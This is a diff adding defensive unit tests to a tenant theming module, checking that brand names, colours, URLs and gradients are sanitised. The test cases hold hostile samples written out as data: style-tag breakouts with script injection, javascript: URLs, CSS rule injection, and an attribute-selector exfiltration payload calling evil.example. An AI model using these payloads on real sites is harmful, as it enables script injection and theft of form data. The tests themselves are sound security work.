@@ -23,6 +23,7 @@ import {
   clearSSRThemeCache,
   fetchPublishedThemeFromGateway,
   getPublishedTenantTheme,
+  isSafeGradient,
   PUBLISHED_THEME_PATH,
   renderTenantThemeCSS,
   resolveRequestTenantSlug,
@@ -73,6 +74,118 @@ describe('brandToTenantTokens — Brand → --tenant-* token strings', () => {
     const tokens = brandToTenantTokens(tricky);
     expect(tokens.name).toBe("'Tom\\'s School'");
     expect(tokens.shortName).toBe("'tom\\'s'");
+  });
+
+  // PRC-M616: a hostile name must not be able to close the <style> element.
+  it('escapes angle brackets so a name cannot break out of <style>', () => {
+    const hostile: Brand = { ...SAMPLE_BRAND, name: '</style><script>alert(1)</script>' };
+    const tokens = brandToTenantTokens(hostile);
+    expect(tokens.name).not.toContain('</style>');
+    expect(tokens.name).not.toContain('<');
+    expect(tokens.name).not.toContain('>');
+  });
+
+  // PRC-L409: colours and URLs are validated against an allow-list and fall
+  // back to the default on any value that could inject CSS/markup.
+  it('rejects a colour that tries to inject extra CSS rules', () => {
+    const hostile: Brand = {
+      ...SAMPLE_BRAND,
+      primary_color: 'red;} body{display:none}',
+      accent_color: '#abc',
+    };
+    const tokens = brandToTenantTokens(hostile);
+    expect(tokens.primary).toBe(DEFAULT_BRAND.primary_color);
+    // a valid short hex is still accepted
+    expect(tokens.accent).toBe('#abc');
+  });
+
+  it('rejects javascript: and data: URLs for logo/favicon', () => {
+    const hostile: Brand = {
+      ...SAMPLE_BRAND,
+      logo: { url: 'javascript:alert(1)', alt: 'x' },
+      favicon: 'data:text/html,<script>',
+    };
+    const tokens = brandToTenantTokens(hostile);
+    expect(tokens.logo).toBe(`url("${DEFAULT_BRAND.logo.url}")`);
+    expect(tokens.favicon).toBe(`url("${DEFAULT_BRAND.favicon}")`);
+  });
+
+  it('accepts https and site-relative URLs for logo/favicon', () => {
+    const ok: Brand = {
+      ...SAMPLE_BRAND,
+      logo: { url: 'https://cdn.example.test/logo.svg', alt: 'x' },
+      favicon: '/favicon.ico',
+    };
+    const tokens = brandToTenantTokens(ok);
+    expect(tokens.logo).toBe('url("https://cdn.example.test/logo.svg")');
+    expect(tokens.favicon).toBe('url("/favicon.ico")');
+  });
+
+  it('rejects a login background that tries to break out', () => {
+    const hostile: Brand = {
+      ...SAMPLE_BRAND,
+      login_background: 'url("x")</style><script>',
+    };
+    const tokens = brandToTenantTokens(hostile);
+    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
+  });
+
+  // PRC-M616 / PRC-L409: the gradient is emitted raw into :root{…}, so it must
+  // not be able to close the declaration/rule or pull in a resource.
+  const RULE_INJECTION =
+    'linear-gradient(red,blue);} body{display:none} :root{--x:linear-gradient(a)';
+  it.each([
+    ['rule injection via ;}', RULE_INJECTION],
+    [
+      'attribute-selector exfiltration',
+      'linear-gradient(red,blue);} input[value^=a]{background:url(https://evil.example/a)} :root{--x:linear-gradient(red,blue)',
+    ],
+    ['nested url(', 'linear-gradient(red, url(https://evil.example/a))'],
+    ['uppercase URL(', 'linear-gradient(red, URL(https://evil.example/a))'],
+    ['semicolon only', 'linear-gradient(red, blue); color: red'],
+    ['brace only', 'linear-gradient(red, blue)}'],
+    ['backslash escape', 'linear-gradient(red, \\75 rl(x))'],
+    ['comment', 'linear-gradient(red /* x */, blue)'],
+    ['at-rule', 'linear-gradient(red, blue) @import x'],
+    ['angle bracket', 'linear-gradient(red, blue)</style>'],
+    ['double quote', 'linear-gradient(red, "blue")'],
+    ['single quote', "linear-gradient(red, 'blue')"],
+    ['newline', 'linear-gradient(red,\nblue)'],
+    ['unbalanced open', 'linear-gradient(red, hsl(1, 2%, 3%)'],
+    ['unbalanced close', 'linear-gradient(red, blue))'],
+    ['trailing content after close', 'linear-gradient(red) , radial-gradient(blue)'],
+  ])('rejects a login background gradient with %s', (_label, value) => {
+    expect(isSafeGradient(value)).toBe(false);
+    const tokens = brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value });
+    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
+  });
+
+  it('keeps injected rules out of the rendered :root block', () => {
+    const css = renderTenantThemeCSS(
+      brandToTenantTokens({ ...SAMPLE_BRAND, login_background: RULE_INJECTION }),
+    );
+    expect(css).not.toContain('display:none');
+    expect(css).not.toContain('body{');
+  });
+
+  it.each([
+    'url(https://evil.example/a);} body{display:none}',
+    'url(https://evil.example/a) red',
+    'url(javascript:alert(1))',
+  ])('rejects a hostile top-level url( login background %#', (value) => {
+    const tokens = brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value });
+    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
+  });
+
+  it.each([
+    'linear-gradient(135deg, hsl(280, 70%, 30%), hsl(280, 70%, 50%))',
+    'radial-gradient(circle at 50% 50%, #fff 0%, #000 100%)',
+    'linear-gradient(to right, rgba(0, 0, 0, 0.5), hsl(222 47% 11% / 0.8))',
+  ])('accepts a well-formed gradient %#', (value) => {
+    expect(isSafeGradient(value)).toBe(true);
+    expect(brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value }).loginBackground).toBe(
+      value,
+    );
   });
 });
 
